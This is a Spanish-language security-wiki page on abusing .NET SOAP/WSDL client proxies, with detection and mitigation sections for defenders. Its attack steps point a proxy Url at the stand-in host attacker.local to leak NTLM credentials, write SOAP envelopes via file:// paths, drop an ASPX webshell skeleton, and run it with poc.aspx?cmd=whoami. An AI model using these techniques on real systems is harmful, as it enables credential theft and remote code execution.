# .NET SOAP/WSDL Abuso del proxy de cliente

{{#include ../../banners/hacktricks-training.md}}

## Resumen

- `SoapHttpClientProtocol`, `DiscoveryClientProtocol` and friends heredan de `HttpWebClientProtocol`, cuyo `GetWebRequest()` devuelve la instancia agnóstica al esquema `WebRequest` producida por `WebRequest.Create()` sin imponer `HttpWebRequest`.
- Si un atacante controla el proxy `Url`, el framework silenciosamente intercambia `FileWebRequest`, `FtpWebRequest` o manejadores UNC/SMB, convirtiendo proxies "HTTP" en gadgets de leak NTLM o en escritores de archivos arbitrarios.
- Cualquier funcionalidad que importe un WSDL suministrado por el atacante con `ServiceDescriptionImporter` agrava el fallo: el WSDL controla el constructor del proxy generado, los métodos SOAP, los tipos complejos y los namespaces, permitiendo RCE pre-auth (webshells, drops de scripts) en productos como Barracuda Service Center RMM, Ivanti EPM, Umbraco 8, PowerShell y SSIS.

## Root cause: HttpWebClientProtocol is scheme-agnostic

`WebClientProtocol.GetWebRequest()` hace `var req = WebRequest.Create(uri)` y lo devuelve sin tocar. `HttpWebClientProtocol.GetWebRequest()` intenta `req as HttpWebRequest` para establecer campos exclusivos de HTTP, pero **aún así devuelve el `req` original** incluso cuando el cast falla. Por tanto el runtime obedece el esquema que esté presente en `Url`:

- `http(s)://` → `HttpWebRequest`
- `file:///` or `\\host\share\` → `FileWebRequest`
- `ftp://` → `FtpWebRequest`

`SoapHttpClientProtocol.Invoke()` luego envía el cuerpo POST SOAP a través del manejador de transporte seleccionado, incluso si eso implica escribir en disco o a través de SMB.

## Primitiva 1 – Captura / relay NTLM vía destinos UNC

1. Obtén control sobre `SoapHttpClientProtocol.Url` (setter directo, valor de config, fila de base de datos, etc.).
2. Apúntalo a una ruta UNC como `file://attacker.local/sink/payload`.
3. El CLR abre la ruta vía SMB y realiza autenticación integrada, leaking NTLM challenge/response al atacante.
4. Usa los hashes capturados para cracking offline o NTLM relay (SMB/HTTP) si signing/EPA no están presentes.

Esto aplica a **cualquier** ruta proxy .NET SOAP/HTTP que acepte entrada de usuario, incluso si no es posible más explotación.

## Primitiva 2 – Escrituras de archivos arbitrarias vía `file://`

1. Establece `Url = "file:///inetpub/wwwroot/poc.aspx"` (o cualquier ruta escribible) antes de la llamada al proxy.
2. Invoca cualquier método SOAP; el framework escribe todo el sobre SOAP en la ruta elegida, sobrescribiendo archivos existentes.
3. Los argumentos controlados por el usuario aparecen dentro de elementos XML, permitiendo a atacantes dejar payloads CSHTML/ASPX o envenenar archivos de configuración.

Limitaciones:

- El contenido es siempre XML; los campos escalares se codifican como entidades, por lo que inyectar `<script>` mediante cadenas simples requiere trucos adicionales.
- Los payloads significativos necesitan al menos un argumento influenciado por el atacante o la capacidad de modificar la firma del método (ver abuso de WSDL).

El runtime frecuentemente lanza `Client found response content type of 'application/octet-stream', but expected 'text/xml'` después de la escritura—trata este error como un IOC.

## Explotación de importaciones WSDL

### Proxies auto-generados vía `ServiceDescriptionImporter`

Muchos productos exponen características de "custom web service" que aceptan una URL de WSDL, y luego:

1. `ServiceDescription.Read()` el WSDL controlado por el atacante.
2. `ServiceDescriptionImporter` genera clases proxy en C# que extienden `SoapHttpClientProtocol`.
3. CodeDOM compila el proxy y reflection invoca el método solicitado.

El atacante controla totalmente:

- `soap:address` / `soap12:address` `location` → se convierte en `base.Url` (puede apuntar a `file://` o rutas UNC).
- Nombres de métodos, listas de parámetros, tipos complejos y serializadores.
- URIs de namespace que terminan como atributos `xmlns:*` en cada mensaje SOAP.

No ocurre validación del esquema, por lo que cada proxy generado hereda el fallo de diseño original.

### Moldeando el sobre SOAP para RCE

- **Serialización de tipos complejos**: Define structs personalizados en el WSDL de modo que cuando `XmlSerializer` los vuelva a emitir, produzcan nombres/atributos de elementos elegidos por el atacante. Para drops de webshell ASPX, crea tipos que serialicen a:
```xml
<script runat="server">
// payload pulling `Request.QueryString["cmd"]`
</script>
```
y apunta `Url` a `file:///.../webroot/shell.aspx` para conseguir RCE.
- **Inyección de namespace**: Incluso cuando los argumentos están codificados (por ejemplo, Umbraco Forms), los namespaces declarados en el WSDL (por ejemplo, `xmlns:tns="http://host/service?x=@{...}"`) se copian verbatim en el sobre SOAP. Codificar payloads dentro de la query string del namespace permite drops de CSHTML Razor o scripts PowerShell sin control de parámetros.

Estas técnicas impulsaron el exploit contra Barracuda Service Center RMM (CVE-2025-34392): una llamada SOAP no autenticada suministró un WSDL malicioso, estableció `soap12:address` a `file:///Program Files/.../SCMessaging/poc.aspx`, inyectó `<script runat="server">` vía parámetros complejos y subió un webshell que ejecutó comandos arbitrarios `cmd.exe`.

## Flujo de ataque típico

1. Identifica funcionalidad que acepte una URL de WSDL o que permita a usuarios configurar endpoints SOAP (p. ej., Barracuda `InvokeRemoteMethod`, conectores Ivanti EPM, datasources de Umbraco 8 Forms, PowerShell `New-WebServiceProxy`).
2. Hospeda un WSDL malicioso cuyo `soap:address` apunte a una ruta escribible o share UNC y cuyas definiciones de esquema provean métodos/tipos adecuados para payloads.
3. Dispara la importación/compilación. El objetivo emite una DLL proxy con constructor y métodos controlados por el atacante.
4. Cuando la aplicación invoca el método generado, la petición SOAP se serializa y escribe en la ruta especificada por el atacante, embebiendo el payload.
5. Ejecuta el archivo dejado (navega a `poc.aspx?cmd=whoami`, carga el CSHTML, o deja que PowerShell ejecute el script) o reutiliza material NTLM capturado.

## Detection & hunting

- **Análisis estático**: Haz grep de `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol`, o `New-WebServiceProxy`. Rastrea cómo se obtiene `Url` o las entradas WSDL—cualquier cosa controlada por el usuario es una señal de alarma.
- **Telemetría en runtime**:
- Instrumenta la creación de proxies para registrar esquemas; alerta sobre valores `file`, `ftp` o UNC.
- Monitorea el característico error "Client found response content type of 'application/octet-stream'" después de las llamadas SOAP.
- Vigila escrituras inesperadas de `.aspx/.cshtml/.ps1` en directorios de la aplicación realizadas por la identidad del servicio web.
- **Señales de red/archivo**: Conexiones SMB iniciadas por servidores web hacia infraestructura atacante, o compilaciones repentinas de DLLs proxy temporales, a menudo preceden la explotación.

## Mitigaciones

- **Hacer validación de transporte** antes de invocar cualquier proxy derivado de `HttpWebClientProtocol`:
```csharp
var uri = new Uri(proxy.Url);
if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
throw new InvalidOperationException("SOAP clients must stay on HTTP/S");
```
- **Sanitizar WSDL importados**: Descarga de proxies a través de un broker que reescriba o rechace entradas `soap:address` que no sean HTTP/S, elimine bindings desconocidos y prohíba trucos de payload en namespaces.
- **Deshabilitar features de WSDL no confiables**: Reemplaza las comodidades de "upload a WSDL" por plantillas server-side verificadas o listas de permitidos.
- **Segregar ubicaciones de escritura**: Asegura que los app pools no puedan escribir en directorios ejecutables; usa volúmenes separados para datos y código de modo que primitivas de escritura no se conviertan en RCE.
- **Endurecer exposición NTLM**: Deshabilita SMB saliente cuando sea posible; si no, aplica SMB signing, EPA y otras mitigaciones contra relay.

## Referencias

- [watchTowr Labs – SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies and WSDL](https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/)

{{#include ../../banners/hacktricks-training.md}}
